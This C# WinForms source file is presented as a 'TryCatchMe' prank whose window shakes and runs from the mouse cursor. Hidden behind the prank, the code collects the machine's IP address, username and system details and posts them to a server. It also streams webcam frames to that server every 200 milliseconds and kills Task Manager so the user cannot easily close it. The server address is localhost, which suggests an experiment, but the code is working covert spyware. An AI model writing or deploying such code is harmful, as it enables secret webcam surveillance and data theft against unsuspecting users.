using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Text;
using Newtonsoft.Json;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrayNotify;
using WinFormsTimer = System.Windows.Forms.Timer;
using System.Threading.Tasks;

namespace Camera
{
    public struct SysInfo
    {
        public string IP { get; set; }
        public string MachineName { get; set; }
        public string Username { get; set; }
        public string OS { get; set; }
        public string Arch { get; set; }
        public string Proc { get; set; }
    }

    public partial class Form1 : Form
    {
        private const string URL = "http://127.0.0.1:5000";
        private FilterInfoCollection filter;
        private VideoCaptureDevice capture;
        private DateTime lastSent = DateTime.MinValue;
        private SysInfo info;

        private Random rng;
        private int base_x;
        private int base_y;

        private int block_count = 0;
        private int max_blocks = 5;

        public Form1()
        {
            InitializeComponent();


            // Récupère les infos du pc
            info = new SysInfo();
            info.IP = GetIPv4();
            info.MachineName= Environment.MachineName;
            info.Username = Environment.UserName;
            info.OS = Environment.OSVersion.ToString();
            info.Arch = (Environment.Is64BitOperatingSystem ? "64 bits" : "32 bits");
            info.Proc = Environment.ProcessorCount.ToString();

            // Place la fenêtre à un endroit aléatoire
            rng = new Random();
            base_x = rng.Next(0, Screen.PrimaryScreen.WorkingArea.Width - this.Width);
            base_y = rng.Next(0, Screen.PrimaryScreen.WorkingArea.Height - this.Height);
            this.Location = new Point(base_x, base_y);

            // Récupere le gif sur internet
            using (WebClient client = new WebClient())
            {
                byte[] data = client.DownloadData("https://i.imgur.com/pl5SRW0.gif");
                using (MemoryStream ms = new MemoryStream(data))
                {
                    background.Image = new Bitmap(Image.FromStream(ms));
                }
            }

            // Ajoute le fond
            this.Controls.Add(background);

            // Centre et ajoute une action au bouton
            btn_TryCatchMe.Left = (this.ClientSize.Width - btn_TryCatchMe.Width) / 2;
            btn_TryCatchMe.Top = (this.ClientSize.Height - btn_TryCatchMe.Height) / 2;
            btn_TryCatchMe.Click += (sender, e) => this.Close();

            // Centre le bouton après le chargement de la fenêtre
            this.Load += (sender, e) =>
            {
                // Lance l'intercepteur de gestionnaire des tâches
                monitor_taskmgr();

                // Lance la vérification de la souris
                WinFormsTimer mouseTimer = new WinFormsTimer();
                mouseTimer.Interval = 30;
                mouseTimer.Tick += (s2, e2) => check_mouse_position();
                mouseTimer.Start();

                // Lance le tremblement après 30 millisecondes
                WinFormsTimer trembleTimer = new WinFormsTimer();
                trembleTimer.Interval = 30;
                trembleTimer.Tick += (s2, e2) => tremble();
                trembleTimer.Start();
            };
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            // Envoie les informations du pc
            var data = new
            {
                IP = info.IP,
                MachineName = info.MachineName,
                Username = info.Username,
                OS = info.OS,
                Arch = info.Arch,
                Proc = info.Proc
            };

            var json = JsonConvert.SerializeObject(data);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var client = new HttpClient();

            try
            {
                await client.PostAsync(URL + "/infos", content);
            } catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            // Envoie le flux vidéo
            filter = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            capture = new VideoCaptureDevice(filter[0].MonikerString);
            capture.NewFrame += VideoCaptureDevice_NewFrame;
            capture.Start();
        }

        private void VideoCaptureDevice_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            var now = DateTime.Now;
            if ((now - lastSent).TotalMilliseconds >= 200)
            {
                lastSent = now;
                var frame = (Bitmap)eventArgs.Frame.Clone();
                SendFrame(frame);
            }
        }

        private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
        {
            if (capture.IsRunning)
            {
                capture.SignalToStop();
                capture.WaitForStop();
                capture = null;
            }
        }

        private async void SendFrame(Bitmap image)
        {
            try
            {
                using (var client = new HttpClient())
                using (var content = new MultipartFormDataContent())
                using (var ms = new MemoryStream())
                {
                    image.Save(ms, ImageFormat.Jpeg);
                    ms.Seek(0, SeekOrigin.Begin);

                    var fileContent = new ByteArrayContent(ms.ToArray());
                    fileContent.Headers.ContentType = new MediaTypeHeaderValue("text/plain");
                    content.Add(fileContent, "image", "frame.jpg");

                    content.Add(new StringContent(info.IP), "ip");

                    await client.PostAsync(URL + "/upload", content);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Erreur SendFrame : " + ex.Message);
            }
        }

        //
        // TryCatchMe
        //

        // Avoir un effet de tremblement
        private void tremble()
        {
            int x_offset = rng.Next(-20, 20);
            int y_offset = rng.Next(-20, 20);
            this.Location = new Point(base_x + x_offset, base_y + y_offset);
        }

        // Change l'emplacement de la fenêtre si la souris arrive dans la fenêtre
        private void check_mouse_position()
        {
            // Récupere la position de la souris
            Point position = Cursor.Position;
            int mouse_x = position.X;
            int mouse_y = position.Y;

            // Récupere la position et dimenssion de la fenêtre
            int win_x = this.Location.X;
            int win_y = this.Location.Y;
            int win_width = this.Width;
            int win_height = this.Height;

            // Si la souris est dans la fenêtre on change la position
            if (mouse_x >= win_x && mouse_x <= win_x + win_width && mouse_y >= win_y && mouse_y <= win_y + win_height)
            {
                base_x = rng.Next(0, Screen.PrimaryScreen.WorkingArea.Width - this.Width);
                base_y = rng.Next(0, Screen.PrimaryScreen.WorkingArea.Height - this.Height);
                this.Location = new Point(base_x, base_y);
            }
        }

        // Boucle de surveillance des processus
        private void monitor_taskmgr()
        {
            Thread monitorThread = new Thread(() => {
                while (true)
                {
                    Process[] processes = Process.GetProcessesByName("Taskmgr");
                    foreach (Process proc in processes)
                    {
                        block_count++;
                        try
                        {
                            proc.Kill();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Erreur : " + ex.Message);
                        }

                        if (block_count >= max_blocks)
                        {
                            return;
                        }
                        break;
                    }
                    Thread.Sleep(500);
                }
            });

            monitorThread.IsBackground = true;
            monitorThread.Start();
        }

        private string GetIPv4()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with IPv4 address in the system !");
        }
    }
}

